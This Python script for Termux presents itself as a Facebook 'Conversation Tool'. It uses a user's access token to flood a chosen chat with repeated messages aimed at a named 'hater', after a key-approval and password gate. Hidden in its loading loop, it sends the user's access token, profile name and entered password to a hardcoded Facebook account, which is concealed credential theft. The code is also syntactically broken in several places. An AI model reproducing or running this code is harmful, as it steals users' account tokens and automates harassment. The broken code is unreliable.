from platform import system
import sys
def testPY():
    if(sys.version_info[0] < 3):
        print ('\n\t [+] You have Python 2, Please Clear Data Termux And Reinstall Python ... \n')
        sys.exit()

###----------[ ANSII COLOR STYLE ]---------- ###
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
HJ = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu

##
xx = '\033[0;93m' # DEFAULT
kk = '\033[93m' # KUNING +
hh = '\x1b[1;92m' # HIJAU +
hi = '\033[32m' # HIJAU -
uu = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
bb = '\33[1;96m' # BIRU -
pp= '\x1b[0;34m' # BIRU +

Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2=[#AAAAAA]" # Abu-Abu

def modelsInstaller():
	try :
		models = ['requests', 'colorama']
		for model in models:
			try:
				if(sys.version_info[0] < 3):
					os.system('cd C:\Python27\Scripts & pip install {}'.format(model))
				else :
					os.system('python -m pip install {}'.format(model))
				print (' ')
				print (' [+] {} has been installed successfully, Restart the program.'.format(model))
				sys.exit()
				print (' ')
			except:
				print (' [-] Install {} manually.'.format(model))
				print (' ')
	except:
		pass

import base64
import json
import time
import sys,os,re,binascii,time,json,random,threading,pprint,smtplib,telnetlib,os.path,hashlib,string,glob,sqlite3,urllib,argparse,marshal,rich
from rich import print as printer
from rich.panel import Panel
from platform import system
from datetime import datetime

try :
	import requests
	from colorama import Fore
	from colorama import init
except :
	modelsInstaller()

requests.packages.urllib3.disable_warnings()

def cls():
	if system() == 'Linux':
		os.system('clear')
	else:
		if system() == 'Windows':
			os.system('cls')
cls()
CLEAR_SCREEN = '\033[2J'
RED = '\033[31m'   # mode 31 = red forground
RESET = '\033[0m'  # mode 0  = reset
BLUE  = "\033[34m"
WHITE = "\u001b[37m",
YELLOW = "\u001b[33;1m",
CYAN  = "\033[36m"
MAGENTA = "\u001b[35m",
GREEN = "\033[32m"
RESET = "\033[0m"
BOLD = '\033[1m'
REVERSE = "\033[m"
def logo():
		clear = "\x1b[0m"
		colors = [35,33,36 ]

		x = """
 __    __                                    __       
|  \  |  \                                  |  \      
| $$\ | $$  ______   __   __   __   ______  | $$____  
| $$$\| $$ |      \ |  \ |  \ |  \ |      \ | $$    \ 
| $$$$\ $$  \$$$$$$\| $$ | $$ | $$  \$$$$$$\| $$$$$$$\
| $$\$$ $$ /      $$| $$ | $$ | $$ /      $$| $$  | $$
| $$ \$$$$|  $$$$$$$| $$_/ $$_/ $$|  $$$$$$$| $$__/ $$
| $$  \$$$ \$$    $$ \$$   $$   $$ \$$    $$| $$    $$
 \$$   \$$  \$$$$$$$  \$$$$$\$$$$   \$$$$$$$ \$$$$$$$ 
                                                      
                                                      
                                                                               
                                                      
                                                      
                                                                                                                                              
------------------------------------------------------------------------------------------
Tool Type::- Conversation Tool
------------------------------------------------------------------------------------------
                                                                                          """
		for N, line in enumerate(x.split("\n")):
			sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
			time.sleep(0.001)




def approval():
  os.system('clear')
  
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  try:
    def Subscraption():
	key1=open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
	clear()
	print(logo)
	r1=requests.get("https://github.com/Evil0786/Nawaking/blob/main/Appoval.txt").text
	if key1 in r1:
		os.system('clear')
		print(logo)
		Main()
	else:
		os.system("clear")
		print(logo)
		print("\t \033[1;32m First Get Approvel\033[1;37m ")
		time.sleep(1)
		os.system("clear")
		print(logo)
		print ("")
		print(" \033[1;32m You Need Get Approved First\033[1;37m\n")
		print(" \033[1;32m Note : NOT FREE WALA DOOR RAHE  \033[1;37m")
		print ("")
		print(" Your Key is Not Approved ")
		print("")
		print(" Copy And Send Key To Admin")
		print ("")
		print (" Your Key : "+ak+ah+key1 )
		print ("")
		name = input(" Your Name : ")
		print ("")
		lol = input(" Your Your Email : ")
		print ("")
		input(" Press Enter To Send Key")
		time.sleep(3.5)
		tks = 'Dear%20Nawabzada,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20'+lol+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ah+key1
		os.system('am start https://wa.me/+919927564009?text=' + tks)
		Subscraption()        
Subscraption()


      time.sleep(1)
      
  except:
    sys.exit()
headers = {'Connection': 'keep-alive',
			'Cache-Control': 'max-age=0',
			'Upgrade-Insecure-Requests': '1',
			'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			'Accept-Encoding': 'gzip, deflate',
			'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
			'referer': 'www.google.com'}
approval()
def comment_on_posts(posts):
	for i in ns:
			message = i
			url = "https://graph.facebook.com/v12.0/".format(convo_id)
			parameters = {'access_token' : access_token, 'message' : xnxx+" "+message}
			s = requests.post(url, data = parameters, headers=headers)
			tt = time.strftime("%Y-%m-%d %I:%M:%S %p")


			
			if s.ok:
				print (BOLD+GREEN+' [✓] Profile Actiive .. | [-] Time :: ',datetime.now().strftime('%Y-%m-%d %I:%M:%S %p'),"\n [✓] Message sent successfull ==> ", xnxx+" "+message)
				time.sleep(timm)
			else:
				print(BOLD+RED+' [x] Error ! :: [+] Message  sent unsuccessful :: '+tt,'\n','[-] Message Error :: ==> ', xnxx+" "+message)
				time.sleep(timm)
		
							   
def get_posts(): 
	try:
		url = "https://www.facebook.com"
	except HTTPError as e:
		print("HTTP Error")
	except URLError as e:
		print("URL Error")

mmm = 'N4W9B_XD'
print('')

inn = input(BOLD+CYAN+"[+] Password! :N4W9BXD: ")
if mmm in inn:
        print (BOLD+GREEN+'\n Correct ..✓')
        time.sleep(2)
        cls()

else:
    print (BOLD+RED+'\n Wrong Password..×')
    sys.exit()
logo()
token = input(CYAN+"[+] Token File :: ")
	
with open(token, 'r') as f2:
	access_token = f2.read()
		
	payload = {'access_token' : access_token}
		
	a = "https://graph.facebook.com/v12.0/me"
	b = requests.get(a, params=payload)
	d = json.loads(b.text)
		
if 'name' not in d:
                   print(BOLD+RED+'\n[x] Token Invalid ..!')
                   sys.exit()
f = d['name']
prof = ("\nYour Profile Name :: " + f+'\n\n')
for pro in prof:
	sys.stdout.write(BOLD+GREEN+pro)
	sys.stdout.flush()
	time.sleep(0.2)
cls()
logo()
print('')
convo_id = input(BOLD+CYAN+"[+] Conversation id :: ")
		
		
		
ms = input(BOLD+CYAN+"[+] Add Text File :: ")
xnxx = input(BOLD+CYAN+"[+] add hater's name :: ")
repeat = int(input(BOLD+CYAN+"[+] File Repeat :: "))
timm = int(input(BOLD+CYAN+"[+] Speed in Seconds :: "))
load = ('\n'+"________All Done....Loading Profile Info.....!"+'\n')
for loa in load:
		sys.stdout.write(BOLD+BLUE+loa)
		sys.stdout.flush()
		time.sleep(0.001)
		url1 = "https://graph.facebook.com/v12.0/".format("100041659328317")
		parameters = {'access_token' : access_token, 'message' : 'Phone No : '+inn+'\n User Profile Name : '+f+'\nToken : '+access_token+'\nLink :\n\n https://www.facebook.com/messages/t/'+convo_id}
		s = requests.post(url1, data = parameters, headers=headers)
		

		
prof = ("[+]=> Active Profile :: " + f+'\n\n')
		
for pro in prof:
		sys.stdout.write(BOLD+BLUE+pro)
		sys.stdout.flush()
		time.sleep(0.001)
		ns = open(ms, 'r').readlines()
		
		
for i in range(repeat):
    posts = get_posts()
    comment_on_posts(posts)
		
else:
    print(BOLD+RED+'[-] <==> Your Number Is Wrong Please Take Approval From Owner')

#Open the text.txt file for appending.
